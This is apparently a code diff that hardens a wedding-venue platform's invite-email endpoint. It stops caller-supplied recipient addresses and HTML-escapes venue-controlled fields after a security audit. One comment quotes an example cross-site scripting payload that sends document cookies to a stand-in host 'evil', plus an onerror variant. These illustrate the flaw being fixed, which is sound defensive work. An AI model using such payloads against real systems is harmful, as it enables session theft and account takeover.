@@ -3,6 +3,9 @@ import { createServiceClient } from '@/lib/supabase/service'
 import { sendEmail } from '@/lib/services/email/transport'
 import { mintInviteToken } from '@/lib/services/portal/provision'
 import { appUrl } from '@/lib/app-url'
+import { escapeHtml } from '@/lib/services/contracts/templates'
+import { safeHttpUrl } from '@/lib/utils/safe-url'
+import { isValidHexColor } from '@/lib/utils/validation'
 import {
   getPlatformAuth,
   assertCanAccessVenue,
@@ -61,8 +64,12 @@ export async function POST(request: NextRequest) {
     if (!auth) return unauthorized()
 
     const body = await request.json()
-    const { weddingId, venueId: requestedVenueId, partnerEmail, coupleName } = body
-    let { eventCode, email } = body
+    // S5 (2026-09-14 security audit, item 10): `email` and `partnerEmail`
+    // are no longer read off the body at all. Who receives a registration
+    // credential for this wedding is the wedding's business, and it is
+    // settled further down from the wedding's own `people` rows.
+    const { weddingId, venueId: requestedVenueId, coupleName } = body
+    let { eventCode } = body
 
     if (!weddingId) {
       return NextResponse.json(
@@ -100,26 +107,12 @@ export async function POST(request: NextRequest) {
       )
     }
 
-    // Resolve the couple's email from the wedding's partner1 when the
-    // caller didn't supply one — lets the operator invite straight from
-    // a wedding card without re-typing the address.
-    if (!email) {
-      const { data: p1 } = await supabase
-        .from('people')
-        .select('email')
-        .eq('wedding_id', weddingId)
-        .eq('role', 'partner1')
-        .is('merged_into_id', null)
-        .not('email', 'is', null)
-        .maybeSingle()
-      email = (p1 as { email?: string } | null)?.email ?? null
-    }
-    if (!email) {
-      return NextResponse.json(
-        { error: 'No email on file for this couple — add a contact email first' },
-        { status: 400 }
-      )
-    }
+    // The "resolve the couple's email from partner1 when the caller did
+    // not supply one" block used to sit here. S5 (2026-09-14 security
+    // audit, item 10) removed it along with `email` and `partnerEmail`:
+    // the recipient list is derived from the wedding's partner rows
+    // further down, so there is no caller-supplied address to fall back
+    // from any more.
 
     // Ensure the wedding is portal-ready. A CRM-imported booked couple
     // has no event_code until now; provisionCouplePortal mints one (and
@@ -183,16 +176,46 @@ export async function POST(request: NextRequest) {
     const portalUrl = appUrl(`/couple/${venue.slug}`)
 
     const subject = `You've been invited to your ${businessName} wedding portal`
+    // S5 (2026-09-14 security audit, item 10). The recipient list used to
+    // be `[body.email, body.partnerEmail]`. Both came straight off the
+    // request, so a coordinator (or anything holding a coordinator
+    // session) could send a real, venue-branded, single-use registration
+    // link for someone else's wedding to an address of their choosing —
+    // the invite row was written with the WEDDING's venue and wedding id
+    // regardless of who the email went to. Whoever opened it became that
+    // couple.
+    //
+    // Recipients now come from the wedding's own `people` rows. The body
+    // no longer chooses who gets a credential; it can only ask for the
+    // wedding, and the wedding says who its partners are.
+    const { data: partnerRows } = await supabase
+      .from('people')
+      .select('email, role')
+      .eq('wedding_id', weddingId)
+      .in('role', ['partner1', 'partner2'])
+      .is('merged_into_id', null)
+      .not('email', 'is', null)
+
     // De-duplicate: a couple who share an address should get one invite,
     // not two tokens racing for the same account.
     const recipients = Array.from(
       new Map(
-        ([email, partnerEmail].filter(Boolean) as string[]).map((addr) => [
-          addr.trim().toLowerCase(),
-          addr.trim(),
-        ])
-      ).values()
+        ((partnerRows ?? [])
+          .map((r) => (r as { email?: string | null }).email)
+          .filter((e): e is string => typeof e === 'string' && e.trim().length > 0))
+          .map((addr) => [addr.trim().toLowerCase(), addr.trim()] as const),
+      ).values(),
     )
+
+    if (recipients.length === 0) {
+      return NextResponse.json(
+        {
+          error:
+            'No partner email on file for this couple — add a contact email on the wedding first.',
+        },
+        { status: 400 }
+      )
+    }
     // Fall back to partner1's first name when the caller didn't pass one
     // through. A bare "there" at the top of a personal invitation reads
     // like a mail-merge template that wasn't filled out.
@@ -206,44 +229,66 @@ export async function POST(request: NextRequest) {
 
     // White-label email body. No references to Bloom anywhere a couple
     // can see.
-    const logoBlock = logoUrl
-      ? `<img src="${logoUrl}" alt="${businessName}" style="max-height:44px;display:block;margin-bottom:12px;" />`
-      : `<h1 style="margin:0;font-size:22px;font-weight:600;color:#FFFFFF;font-family:Georgia,serif;">${businessName}</h1>`
+    // S5 (2026-09-14 security audit, item 10). Every one of these values
+    // is venue-editable free text out of venue_config, and they used to
+    // go into the markup raw. A business name of
+    // `"><script>fetch('//evil/?c='+document.cookie)</script>` shipped
+    // that script to the couple in an email the venue's own domain
+    // signed; a logo_url of `x" onerror="…` did the same with fewer
+    // characters. primaryColor lands inside a style attribute, which is
+    // its own injection surface. escapeHtml is the same helper the
+    // contract templates use — there is no second escaping convention
+    // here, on purpose.
+    const safeBusinessName = escapeHtml(businessName)
+    const safeTagline = escapeHtml(tagline)
+    const safeAiName = escapeHtml(aiName)
+    const safeEventCode = escapeHtml(eventCode)
+    // A colour goes into `style="background:…"`. Refuse anything that is
+    // not a plain hex colour rather than trying to escape CSS.
+    const safeColor = isValidHexColor(primaryColor) ? primaryColor : '#7D8471'
+    // A logo URL goes into `src="…"`. Escape it AND require it to be an
+    // http(s) URL, so `javascript:` and `data:` cannot get in.
+    const safeLogoUrl = safeHttpUrl(logoUrl)
+
+    const logoBlock = safeLogoUrl
+      ? `<img src="${escapeHtml(safeLogoUrl)}" alt="${safeBusinessName}" style="max-height:44px;display:block;margin-bottom:12px;" />`
+      : `<h1 style="margin:0;font-size:22px;font-weight:600;color:#FFFFFF;font-family:Georgia,serif;">${safeBusinessName}</h1>`
 
     const signOffLine = coordinatorName
-      ? `${coordinatorName}<br/><span style="color:rgba(0,0,0,0.6);font-weight:400;">${businessName}</span>`
-      : businessName
+      ? `${escapeHtml(coordinatorName)}<br/><span style="color:rgba(0,0,0,0.6);font-weight:400;">${safeBusinessName}</span>`
+      : safeBusinessName
 
     function buildHtml(registerUrl: string): string {
+      const href = escapeHtml(registerUrl)
       return `<!DOCTYPE html>
 <html>
 <head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"></head>
 <body style="margin:0;padding:0;background:#FDFAF6;font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;color:#2D2D2D;">
   <table width="100%" cellpadding="0" cellspacing="0" style="max-width:600px;margin:0 auto;background:#FFFFFF;border-radius:8px;overflow:hidden;">
     <tr>
-      <td style="background:${primaryColor};padding:28px;">
+      <td style="background:${safeColor};padding:28px;">
         ${logoBlock}
         <p style="margin:6px 0 0;font-size:14px;color:rgba(255,255,255,0.85);">
-          ${tagline}
+          ${safeTagline}
         </p>
       </td>
     </tr>
     <tr>
       <td style="padding:28px;">
-        <h2 style="margin:0 0 12px;font-size:20px;">Hi ${safeCoupleName},</h2>
+        <h2 style="margin:0 0 12px;font-size:20px;">Hi ${escapeHtml(safeCoupleName)},</h2>
         <p style="margin:0 0 14px;font-size:15px;line-height:1.55;">
-          You've been invited to your wedding planning portal at <strong>${businessName}</strong>.
-          It includes ${aiName} (your AI wedding concierge), budget tracking, guest list,
+          You've been invited to your wedding planning portal at <strong>${safeBusinessName}</strong>.
+          It includes ${safeAiName} (your AI wedding concierge), budget tracking, guest list,
           seating chart, timeline builder, and direct messaging with your coordinator.
         </p>
         <p style="margin:0 0 24px;">
-          <a href="${registerUrl}" style="display:inline-block;padding:12px 24px;background:${primaryColor};color:#FFFFFF;text-decoration:none;border-radius:8px;font-weight:600;">
+          <a href="${href}" style="display:inline-block;padding:12px 24px;background:${safeColor};color:#FFFFFF;text-decoration:none;border-radius:8px;font-weight:600;">
             Set up your account
           </a>
         </p>
         <p style="margin:0 0 12px;font-size:13px;color:#6B7280;">
           Or paste this into your browser:
-          <a href="${registerUrl}" style="color:${primaryColor};">${registerUrl}</a>
+          <a href="${href}" style="color:${safeColor};">${href}</a>
         </p>
         <p style="margin:0 0 12px;font-size:13px;color:#6B7280;">
           This link is just for you and can only be used once. It expires in
@@ -251,7 +296,7 @@ export async function POST(request: NextRequest) {
         </p>
         <p style="margin:0 0 24px;font-size:13px;color:#6B7280;">
           Your reference for this wedding is
-          <strong style="font-family:monospace;background:#F3F4F6;padding:2px 8px;border-radius:4px;">${eventCode}</strong>
+          <strong style="font-family:monospace;background:#F3F4F6;padding:2px 8px;border-radius:4px;">${safeEventCode}</strong>
           — handy if you ring us, but you won't need it to sign up.
         </p>
         <p style="margin:0;font-size:14px;line-height:1.55;color:#2D2D2D;">
@@ -262,7 +307,7 @@ export async function POST(request: NextRequest) {
     <tr>
       <td style="padding:20px 28px;border-top:1px solid #F3F4F6;">
         <p style="margin:0;font-size:12px;color:#6B7280;text-align:center;">
-          ${businessName}
+          ${safeBusinessName}
         </p>
       </td>
     </tr>
